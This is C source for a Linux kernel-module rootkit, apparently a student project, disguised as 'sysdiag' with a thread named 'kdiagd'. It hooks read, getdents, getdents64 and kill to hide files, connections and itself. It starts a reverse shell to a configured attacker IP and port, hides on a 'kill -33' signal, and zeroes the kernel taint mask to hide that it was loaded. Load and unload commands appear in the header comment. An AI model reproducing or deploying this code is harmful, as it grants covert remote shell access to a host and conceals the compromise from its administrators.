/*
 * sysdiag - minimal educational LKM rootkit (FYP build)
 * Ported from "rasta" to RHEL 7 / kernel 3.10, scope-limited per
 * project requirements: reverse shell + stealth, no privesc.
 *
 * Load:  insmod sysdiag.ko attacker_ip=192.168.56.10 attacker_port=4444
 * Toggle visibility:  kill -33 1
 * Unload:             kill -33 1 && rmmod sysdiag
 */

#include "include/headers.h"

/* ---- load-time parameters (must be defined BEFORE rev-shell.h) ---- */
static char *attacker_ip   = "192.168.56.10";
static int   attacker_port = 4444;
module_param(attacker_ip, charp, 0);
module_param(attacker_port, int, 0);
MODULE_PARM_DESC(attacker_ip,   "IP the reverse shell connects back to");
MODULE_PARM_DESC(attacker_port, "Port the reverse shell connects back to");

/* 0 = visible after load (easy demo/uninstall), 1 = hide immediately */
#define AUTO_HIDE 0

/* hooking engine (syscall-table swap) */
#include "ftrace/ftrace.h"

/* hooks - ORDER MATTERS:
 *   getdents.h first  -> defines PREFIX, MARKER, filter_dirents(),
 *                         struct linux_dirent (used by getdents64.h, read.h)
 *   read.h            -> defines hide_conn_init(), hooked_read
 *   rev-shell.h       -> uses attacker_ip/attacker_port + MARKER       */
#include "hooks/getdents.h"
#include "hooks/getdents64.h"
#include "hooks/kill.h"
#include "hooks/read.h"
#include "kprobe/rev-shell.h"

/* ---- the hook table: 4 syscalls ---- */
static struct ftrace_hook hooks[] = {
    HOOK(__NR_read,       "sys_read",       hooked_read,       &og_read),
    HOOK(__NR_getdents,   "sys_getdents",   hooked_getdents,   &og_getdents),
    HOOK(__NR_getdents64, "sys_getdents64", hooked_getdents64, &og_getdents64),
    HOOK(__NR_kill,       "sys_kill",       hooked_kill,       &og_kill),
};

/* the kernel sets the taint flag exactly once, during module load
 * (before our init runs) and nothing re-taints it afterwards, so
 * clearing it once here is sufficient. */
static void clear_taint(void)
{
    int *taint = (int *)kallsyms_lookup_name("tainted_mask");
    if (taint)
        *taint = 0;
}

static int __init sysdiag_init(void)
{
    int err;

    hide_conn_init();                    /* precompute ":05C8" style string */

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    mon_it = kthread_run(__shell, NULL, "kdiagd");
    if (IS_ERR(mon_it)) {
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        return PTR_ERR(mon_it);
    }

    clear_taint();

#if AUTO_HIDE
    hideme();
#endif
    return 0;
}

static void __exit sysdiag_exit(void)
{
    if (mon_it)
        kthread_stop(mon_it);

    if (hidden)          /* safety: never tear down while invisible */
        showme();

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

MODULE_LICENSE("GPL");
module_init(sysdiag_init);
module_exit(sysdiag_exit);